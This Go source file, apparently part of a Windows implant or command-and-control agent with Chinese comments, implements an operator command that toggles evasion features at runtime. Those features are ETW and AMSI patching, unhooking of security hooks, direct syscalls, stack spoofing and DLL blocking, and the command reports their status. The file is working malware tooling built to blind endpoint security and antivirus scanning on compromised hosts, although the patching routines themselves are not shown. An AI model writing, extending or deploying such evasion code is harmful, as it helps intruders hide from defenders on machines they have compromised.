//go:build windows

package commands

import (
	"fmt"
	"strings"

	"implant/core/config"
	"implant/core/evasion"
)

// EvasionControl 运行期对抗开关（P4）。
//
// 为什么需要它：P0–P3 把能力做了出来，但"要不要用"只能靠生成载荷时勾选 ——
// 一次选错就得重出载荷。这里提供会话内的内存覆盖（不落盘、不跨重连），
// 让验证阶段可以先关掉某个能力确认行为，再打开。
//
// 语义（与前端面板一致）：
//   - 覆写优先于编译期占位符，但**不能让平台做不到的能力生效**（例如 386 上的
//     direct syscall、syscallMode=none 时的栈伪造）——这类请求直接拒绝并说明原因。
//   - 启动期能力（etw/amsi/unhook）运行期打开 = 立刻执行一次；关掉只是改标记，
//     不会撤销已经打上去的补丁（字节已经改了，撤销需要另一套磁盘映像比对逻辑，
//     而那正是 unhook 干的事）。
func EvasionControl(cmdBuf []byte) ([]byte, error) {
	args := strings.Fields(strings.ToLower(strings.TrimSpace(string(cmdBuf))))
	if len(args) == 0 || args[0] == "status" || args[0] == "list" {
		return []byte(renderEvasionStatus()), nil
	}

	switch args[0] {
	case "reset", "clear":
		cleared := config.ClearEvasionOverrides()
		if len(cleared) == 0 {
			return []byte("[+] 没有运行期覆盖，当前全部为生成期默认值\n"), nil
		}
		var b strings.Builder
		fmt.Fprintf(&b, "[+] 已清除 %d 项运行期覆盖，回到生成期默认值: %s\n", len(cleared), keysToNames(cleared))
		b.WriteString(renderEvasionStatus())
		return []byte(b.String()), nil

	case "all":
		if len(args) != 2 || (args[1] != "on" && args[1] != "off") {
			return nil, fmt.Errorf("用法: evasion all on|off")
		}
		on := args[1] == "on"
		return []byte(applyEvasionAll(on)), nil

	case "on", "off":
		if len(args) < 2 {
			return nil, fmt.Errorf("用法: evasion %s <能力名>（可用能力见 evasion status）", args[0])
		}
		// 能力名允许带空格/下划线/连字符三种写法（"block dlls"/"block_dlls"/"blockdlls"），
		// 所以把剩下所有字段拼回去再归一，而不是只取 args[1]。
		key, ok := parseEvasionKey(strings.Join(args[1:], ""))
		if !ok {
			return nil, fmt.Errorf("未知能力: %s（可用: %s）", strings.Join(args[1:], " "), evasionKeyList())
		}
		line := applyEvasionKey(key, args[0] == "on")
		return []byte(line + "\n" + renderEvasionStatus()), nil
	}

	return nil, fmt.Errorf("用法: evasion [status|reset|all on|off|on <能力>|off <能力>]")
}

// parseEvasionKey 解析能力名，容忍 block_dlls / block-dlls / blockdlls 三种写法
// （前端、文档、口头叫法不一致时不该逼运维去查拼写）。
func parseEvasionKey(raw string) (config.EvasionKey, bool) {
	norm := strings.NewReplacer("_", "", "-", "", " ", "").Replace(strings.ToLower(raw))
	for _, c := range config.EvasionCapabilities() {
		if string(c.Key) == norm {
			return c.Key, true
		}
	}
	return "", false
}

func evasionKeyList() string {
	var names []string
	for _, c := range config.EvasionCapabilities() {
		names = append(names, string(c.Key))
	}
	return strings.Join(names, "/")
}

func keysToNames(keys []config.EvasionKey) string {
	var names []string
	for _, k := range keys {
		names = append(names, string(k))
	}
	return strings.Join(names, ", ")
}

// applyEvasionKey 设置单项并返回一行回执。启动期能力在这里就执行动作。
func applyEvasionKey(key config.EvasionKey, on bool) string {
	// 只有"打开"需要检查前置条件：关掉永远不会失效，拒绝关闭只会让状态更乱
	// （例如 syscallMode=none 的载荷想把 spoof 明确标成关，没有理由拦它）。
	if on {
		if reason := config.EvasionImpossibleReason(key); reason != "" {
			return fmt.Sprintf("⚠️ %s: 无法生效 — %s", key, reason)
		}
	}
	if err := config.SetEvasionOverride(key, on); err != nil {
		return fmt.Sprintf("⚠️ %s: %v", key, err)
	}
	if !on {
		// 关闭不需要额外动作：各调用点每次使用都会重新读开关。
		return fmt.Sprintf("✅ %s: 运行期已关闭（下次使用即生效；已发生的动作不撤销）", key)
	}
	switch key {
	case config.EvasionETW:
		rep, err := evasion.PatchETW()
		if err != nil {
			return fmt.Sprintf("⚠️ %s: 已置为开，但立即打补丁失败 — %v（已 patch: %v）", key, err, rep.Patched())
		}
		return fmt.Sprintf("✅ %s: 运行期已打开并立即生效（patched: %s）", key, strings.Join(rep.Patched(), ","))
	case config.EvasionAMSI:
		rep, err := evasion.PatchAMSI()
		if err != nil {
			return fmt.Sprintf("⚠️ %s: 已置为开，但立即打补丁失败 — %v（已 patch: %v）", key, err, rep.Patched())
		}
		return fmt.Sprintf("✅ %s: 运行期已打开并立即生效（patched: %s）", key, strings.Join(rep.Patched(), ","))
	case config.EvasionUnhook:
		reps, err := evasion.UnhookAll()
		if err != nil {
			return fmt.Sprintf("⚠️ %s: 已置为开，但 unhook 失败 — %v", key, err)
		}
		var parts []string
		for _, r := range reps {
			parts = append(parts, r.String())
		}
		return fmt.Sprintf("✅ %s: 运行期已打开并立即执行 — %s", key, strings.Join(parts, "; "))
	default:
		return fmt.Sprintf("✅ %s: 运行期已打开（下次使用即生效）", key)
	}
}

// applyEvasionAll 批量开关；做不到的能力跳过并逐条说明，不整体失败。
func applyEvasionAll(on bool) string {
	var b strings.Builder
	if on {
		fmt.Fprintf(&b, "🔐 批量打开全部对抗能力（%d 项）\n", len(config.EvasionCapabilities()))
	} else {
		fmt.Fprintf(&b, "🔐 批量关闭全部对抗能力（%d 项）\n", len(config.EvasionCapabilities()))
	}
	for _, c := range config.EvasionCapabilities() {
		b.WriteString(applyEvasionKey(c.Key, on))
		b.WriteString("\n")
	}
	b.WriteString(renderEvasionStatus())
	return b.String()
}

// renderEvasionStatus 当前状态表：生成期值 / 生效值 / 是否被运行期覆盖。
func renderEvasionStatus() string {
	var b strings.Builder
	b.WriteString("🔐 对抗能力开关（生成期值 → 当前生效值）\n")
	rows := config.EvasionStatus()
	for _, r := range rows {
		state := "关"
		if r.Active {
			state = "开"
		}
		def := "关"
		if r.Compiled {
			def = "开"
		}
		src := "生成期"
		if r.Overridden {
			src = "运行期覆盖"
		}
		line := fmt.Sprintf("%-11s %s → %s  [%s]", string(r.Key), def, state, src)
		if reason := config.EvasionImpossibleReason(r.Key); reason != "" && r.Active {
			line += "  ⚠️ " + reason
		} else if r.Note != "" {
			line += "  (" + r.Note + ")"
		}
		b.WriteString(line)
		b.WriteString("\n")
	}
	b.WriteString("提示：运行期覆盖只在内存里，重连/重启后回到生成期值；启动期能力关掉不会撤销已生效的补丁。\n")
	return b.String()
}
